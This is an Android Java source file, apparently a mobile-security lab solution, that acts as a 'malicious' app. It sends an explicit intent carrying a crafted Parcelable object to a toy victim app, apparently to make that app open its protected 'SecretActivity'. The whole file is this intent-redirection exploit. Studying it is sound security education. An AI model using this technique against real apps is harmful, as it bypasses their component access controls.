package com.example.maliciousapp;

import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. create a object AmazingPackage with victim app's package and activity name
        com.example.victimapp.AmazingPackage payload =
                new com.example.victimapp.AmazingPackage(
                        "com.example.victimapp",
                        "com.example.victimapp.SecretActivity"
                );

        // 2. Create the explicit intent (need to specify an action)
        Intent intent = new Intent("mobiotsec.PACKAGE_INCOMING");

        // specify the victim app's package to make it explicit
        intent.setPackage("com.example.victimapp");

        // 3. putExtra the Parcelable object
        intent.putExtra("PACKAGE", payload);

        // 4. LAUNCH
        try {
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }


    }
}